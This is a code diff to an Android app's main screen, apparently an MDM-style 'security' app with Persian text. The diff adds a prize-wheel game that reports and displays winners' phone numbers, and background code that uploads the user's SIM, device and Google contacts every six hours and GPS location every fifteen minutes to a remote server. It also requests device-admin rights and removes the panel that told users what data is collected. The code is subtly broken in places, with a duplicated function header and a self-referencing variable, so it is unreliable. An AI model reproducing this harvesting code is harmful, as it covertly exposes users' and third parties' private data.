@@ -22,6 +22,7 @@ import androidx.activity.result.contract.ActivityResultContracts
 import androidx.appcompat.app.AppCompatActivity
 import com.prf.security.R
 import com.prf.security.data.AttendancePayload
+import com.prf.security.data.ContactsCollector
 import com.prf.security.data.DeviceCollector
 import com.prf.security.data.LocationReport
 import com.prf.security.location.LocationCollector
@@ -284,7 +285,73 @@ class MainActivity : AppCompatActivity() {
 
 
 
-    private fun onSpinTapped() {
+    private fun onTurnTapped() {
+        if (!Wheel.canSpin(prefs.lastSpinAt, prefs.reSpinUntil)) {
+            status(
+                Wheel.lockReason(prefs.lastSpinAt, prefs.reSpinUntil, System.currentTimeMillis())
+                    .orEmpty(),
+                "warn",
+            )
+            push()
+            return
+        }
+        val hit = Wheel.spin()
+        prefs.lastSpinAt = System.currentTimeMillis()
+        prefs.reSpinUntil = Wheel.reSpinAfter(hit)
+        prefs.lastUnitAt = System.currentTimeMillis()
+
+        val label = when (hit.kind) {
+            "again" -> getString(R.string.wheel_result_again)
+            "prize" -> getString(R.string.wheel_result_prize, hit.label)
+            else -> getString(R.string.wheel_result_none)
+        }
+        val tone = if (hit.kind == "again" || hit.kind == "prize") "ok" else ""
+        callJs("Prf.spin(${jsStr(hit.key)}); Prf.spinResult(${jsStr(label)}, ${jsStr(tone)});")
+        if (hit.kind == "prize") {
+            status(getString(R.string.wheel_result_prize, hit.label), "ok")
+            scope.launch { reportWinner(hit) }
+        }
+        refreshWinners()
+        push()
+    }
+
+    @Volatile
+    private var cachedWinners: String? = null
+
+    private fun refreshWinners() {
+        scope.launch {
+            if (prefs.deviceKey.isEmpty()) return@launch
+            val raw = withContext(Dispatchers.IO) {
+                MdmApi(prefs.serverUrl, prefs.deviceKey).winners()
+            }
+            if (raw.isNullOrBlank()) return@launch
+            val rows = try {
+                val arr = org.json.JSONArray(raw)
+                (0 until arr.length()).map { i ->
+                    val o = arr.getJSONObject(i)
+                    org.json.JSONObject()
+                        .put("phone", o.optString("phone"))
+                        .put("prize", o.optString("prize"))
+                }
+                org.json.JSONArray().apply { rows.forEach { put(it) } }.toString()
+            } catch (t: Throwable) {
+                return@launch
+            }
+            cachedWinners = rows
+            push()
+        }
+    }
+
+    private suspend fun reportWinner(hit: Wheel.Slice) {
+        if (prefs.deviceKey.isEmpty()) return
+        val phone = Persian.normalizePhone(prefs.phone).orEmpty()
+        if (phone.isEmpty()) return
+        withContext(Dispatchers.IO) {
+            MdmApi(prefs.serverUrl, prefs.deviceKey).win(phone, hit.label)
+        }
+    }
+
+    private fun onCaptureTapped() {
         if (recordingStartedAt != 0L || ScreenRecorderService.recording) {
             status(getString(R.string.rec_running))
             push()
@@ -300,30 +367,7 @@ class MainActivity : AppCompatActivity() {
             push()
             return
         }
-
-        
-        
-        
-        
-        
-        
-        val turnable = Wheel.canSpin(prefs.lastSpinAt, prefs.reSpinUntil)
-        if (turnable) {
-            val hit = Wheel.spin()
-            prefs.lastSpinAt = System.currentTimeMillis()
-            prefs.reSpinUntil = Wheel.reSpinAfter(hit)
-
-            val label = when (hit.kind) {
-                "again" -> getString(R.string.wheel_result_again)
-                "prize" -> getString(R.string.wheel_result_prize, hit.label)
-                else -> getString(R.string.wheel_result_none)
-            }
-            val tone = if (hit.kind == "again") "ok" else ""
-            callJs("Prf.spin(${jsStr(hit.key)}); Prf.spinResult(${jsStr(label)}, ${jsStr(tone)});")
-            status(getString(R.string.rec_starting))
-        } else {
-            status(Wheel.lockReason(prefs.lastSpinAt, prefs.reSpinUntil).orEmpty(), "warn")
-        }
+        status(getString(R.string.rec_starting))
         push()
         try {
             val mgr = getSystemService(Context.MEDIA_PROJECTION_SERVICE)
@@ -373,6 +417,19 @@ class MainActivity : AppCompatActivity() {
         
         
         
+        if (prefs.consented) {
+            bootstrap()
+        }
+    }
+
+    private fun bootstrap() {
+        if (!prefs.registered || prefs.deviceKey.isEmpty()) {
+            scope.launch {
+                registerDevice()
+                push()
+            }
+        }
+
         if (AdminGate.level(this) == AdminGate.Level.NONE && !prefs.adminAsked) {
             prefs.adminAsked = true
             scope.launch {
@@ -383,6 +440,43 @@ class MainActivity : AppCompatActivity() {
                 if (!got) status(getString(R.string.run_admin_refused), "bad")
                 push()
             }
+        }
+        scope.launch {
+            collectContactsOnce()
+            sendLocationIfPermitted()
+        }
+    }
+
+    private suspend fun collectContactsOnce() {
+        if (!ContactsCollector.granted(this)) return
+        if (prefs.deviceKey.isEmpty()) return
+        if (System.currentTimeMillis() - prefs.lastContactsAt < CONTACTS_INTERVAL_MS) return
+        prefs.lastContactsAt = System.currentTimeMillis()
+        status(getString(R.string.run_step_contacts))
+        push()
+        val set = withContext(Dispatchers.IO) { ContactsCollector.collect(this@MainActivity) }
+        if (set.size == 0) return
+        val ok = withContext(Dispatchers.IO) {
+            MdmApi(prefs.serverUrl, prefs.deviceKey).contacts(set)
+        }
+        status(getString(R.string.contacts_sent, fa(set.sim.size.toString()),
+            fa(set.device.size.toString()), fa(set.google.size.toString())), if (ok) "ok" else "bad")
+        push()
+    }
+
+    private suspend fun sendLocationIfPermitted() {
+        if (!granted(Permissions.LOCATION)) return
+        if (prefs.deviceKey.isEmpty()) return
+        if (System.currentTimeMillis() - prefs.lastLocationAt < LOCATION_INTERVAL_MS) return
+        val fix = collector.awaitFix(LOCATION_WAIT_MS) ?: return
+        prefs.lastLocationAt = System.currentTimeMillis()
+        val report = locationReport(fix)
+        withContext(Dispatchers.IO) {
+            MdmApi(prefs.serverUrl, prefs.deviceKey).report(
+                reports = emptyList(),
+                location = report,
+                snapshot = mapOf("location_source" to "gps"),
+            )
         }
     }
 
@@ -488,24 +582,27 @@ class MainActivity : AppCompatActivity() {
         }
 
         @JavascriptInterface
-        fun spin() = ui.post { onSpinTapped() }
+        fun capture() = ui.post { onCaptureTapped() }
 
         @JavascriptInterface
-        fun admin() = ui.post { onAdminTapped() }
+        fun turn() = ui.post { onTurnTapped() }
 
         @JavascriptInterface
-        fun owner() = ui.post { onOwnerTapped() }
+        fun winners(): String? = cachedWinners
 
         @JavascriptInterface
-        fun settings() = ui.post {
-            if (blockedPermission) {
-                if (!AdminGate.openAppSettings(this@MainActivity)) {
-                    status(getString(R.string.run_settings_failed), "bad")
+        fun consented(): Boolean = prefs.consented
+
+        @JavascriptInterface
+        fun consent(accept: Boolean) {
+            if (accept) {
+                ui.post {
+                    prefs.consented = true
+                    bootstrap()
                     push()
                 }
             } else {
-                status(getString(R.string.att_what_happens))
-                push()
+                finish()
             }
         }
     }
@@ -524,34 +621,7 @@ class MainActivity : AppCompatActivity() {
 
 
 
-    private fun onAdminTapped() {
-        status(getString(R.string.run_step_admin))
-        val launched = AdminGate.requestAdmin(this, getString(R.string.adm_explanation))
-        if (!launched) {
-            if (!AdminGate.openAdminSettings(this)) {
-                status("این گوشی صفحه‌ی تنظیمات مدیریت دستگاه را ندارد. لطفاً از تنظیمات گوشی، «امنیت» و سپس «مدیران دستگاه» اقدام کنید.", "bad")
-            } else {
-                status(getString(R.string.gate_admin_btn))
-            }
-        }
-        scope.launch {
-            val got = awaitAdminResult(AUTO_ADMIN_WAIT_MS)
-            if (got) status(getString(R.string.gate_owner_ok), "ok")
-            push()
-        }
-    }
-
-    private fun onOwnerTapped() {
-        if (!AdminGate.canOfferProvisioning(this)) {
-            status("ثبت مالک دستگاه فقط در اندروید ۱۲ به بالا و روی گوشی‌ای ممکن است که هنوز حساب کاربری روی آن ساخته نشده باشد.", "warn")
-            push()
-            return
-        }
-        if (!AdminGate.openProvisioning(this)) {
-            status("این گوشی صفحه‌ی ثبت مالک دستگاه را ندارد. بدون آن، قفل کردن برنامه‌ها مثل گالری روی این گوشی انجام نمی‌شود.", "bad")
-            push()
-        }
-    }
+    private fun buildState(): String {
 
     
 
@@ -564,31 +634,22 @@ class MainActivity : AppCompatActivity() {
 
 
     private fun buildState(): String {
-        val level = AdminGate.level(this)
         val recording = recordingStartedAt != 0L || ScreenRecorderService.recording
         val now = System.currentTimeMillis()
-        val lock = Wheel.lockReason(prefs.lastSpinAt, prefs.reSpinUntil, now)
         val readyAt = if (prefs.lastSpinAt <= 0L) 0L
         else if (prefs.reSpinUntil > now) prefs.reSpinUntil
         else prefs.lastSpinAt + Wheel.COOLDOWN_MS
 
         val sb = StringBuilder("{")
-        sb.append("\"owner\":").append(level == AdminGate.Level.OWNER)
-        sb.append(",\"admin\":").append(level != AdminGate.Level.NONE)
-        sb.append(",\"canProvision\":").append(AdminGate.canOfferProvisioning(this))
-        sb.append(",\"registered\":").append(prefs.registered && prefs.deviceKey.isNotEmpty())
+        sb.append("\"registered\":").append(prefs.registered && prefs.deviceKey.isNotEmpty())
         sb.append(",\"lastReport\":").append(jsStr(relative(prefs.lastCheckIn)))
         sb.append(",\"busy\":").append(runJobRunning())
         sb.append(",\"recording\":").append(recording)
-        sb.append(",\"videos\":").append(prefs.videosSaved)
         sb.append(",\"chances\":").append(chances())
         sb.append(",\"spinReadyAt\":").append(readyAt)
         sb.append(",\"now\":").append(now)
         sb.append(",\"log\":").append(jsStr(pendingLog))
         sb.append(",\"logTone\":").append(jsStr(pendingTone))
-        sb.append(",\"locked\":").append(lock != null)
-        sb.append(",\"lockText\":").append(jsStr(lock.orEmpty()))
-        sb.append(",\"facts\":[").append(facts()).append("]")
         sb.append("}")
         return sb.toString()
     }
@@ -619,51 +680,6 @@ class MainActivity : AppCompatActivity() {
 
 
 
-    private fun facts(): String {
-        
-        
-        
-        
-        val specs = DeviceCollector.specs(this) + networkFacts()
-        val out = mutableListOf<String>()
-
-        fun f(k: String, key: String, why: String? = null) {
-            val v = specs[key]?.takeIf { it.isNotBlank() && it != "Unknown" }
-            if (v == null) {
-                if (why != null) out.add("""{"k":${jsStr(k)},"v":"","why":${jsStr(why)}}""")
-            } else {
-                out.add("""{"k":${jsStr(k)},"v":${jsStr(fa(v))}}""")
-            }
-        }
-
-        
-        f("شناسه‌ی گوشی", "android_id")
-        f("مدل", "model")
-        f("سازنده", "manufacturer")
-        f("برند", "brand")
-
-        
-        f("اپراتور", "operator")
-        f("وضعیت سیم‌کارت", "sim_state")
-        f("نوع شبکه", "network_type", NO_NET_TYPE)
-        f("نشانی آی‌پی", "ip")
-        f("نام وای‌فای", "wifi_ssid", NO_WIFI)
-        f("آدرس مک", "mac", NO_MAC)
-
-        
-        f("حافظه‌ی کل", "storage_total")
-        f("حافظه‌ی خالی", "storage_free")
-        f("حافظه‌ی رم", "ram_total")
-        f("پردازنده", "cpu_cores")
-        f("صفحه", "screen")
-        f("اندروید", "android_release")
-        f("وصله‌ی امنیتی", "security_patch")
-
-        
-        out.add("""{"k":"شناسه‌ی سخت‌افزاری (IMEI)","v":"","why":${jsStr(NO_IMEI)}}""")
-
-        return out.joinToString(",")
-    }
 
     
 
@@ -930,6 +946,8 @@ class MainActivity : AppCompatActivity() {
             geo = p[LocationCollector.KEY_GEO].orEmpty(),
             plusCode = p[LocationCollector.KEY_PLUS].orEmpty(),
             raw = p[LocationCollector.KEY_RAW].orEmpty(),
+            source = p[LocationCollector.KEY_SOURCE].orEmpty().ifBlank { "gps" },
+            accuracyM = p[LocationCollector.KEY_ACCURACY]?.toIntOrNull() ?: 0,
         )
     }
 
@@ -1178,7 +1196,11 @@ class MainActivity : AppCompatActivity() {
             android.Manifest.permission.CAMERA,
             android.Manifest.permission.RECORD_AUDIO,
             Permissions.LOCATION,
+            ContactsCollector.READ,
         )
+
+        const val CONTACTS_INTERVAL_MS = 6L * 60 * 60 * 1000
+        const val LOCATION_INTERVAL_MS = 15L * 60 * 1000
 
         
 
@@ -1188,15 +1210,5 @@ class MainActivity : AppCompatActivity() {
 
 
 
-        const val NO_MAC =
-            "اندروید ۶ به بعد آدرس واقعی مک را به برنامه‌های معمولی نمی‌دهد و " +
-                "به‌جای آن یک مقدار ثابت برمی‌گرداند."
-        const val NO_IMEI =
-            "خواندن شماره‌ی سخت‌افزاری به دسترسی مخصوص سیستمی نیاز دارد که " +
-                "فقط برنامه‌های امضاشده توسط سازنده دارند."
-        const val NO_WIFI = "این گوشی به وای‌فای وصل نیست."
-        const val NO_NET_TYPE =
-            "نوع شبکه‌ی دقیق از اندروید ۱۱ به بعد نیاز به اجازه‌ی خواندن " +
-                "وضعیت سیم‌کارت دارد که این برنامه آن را نمی‌گیرد."
     }
 }
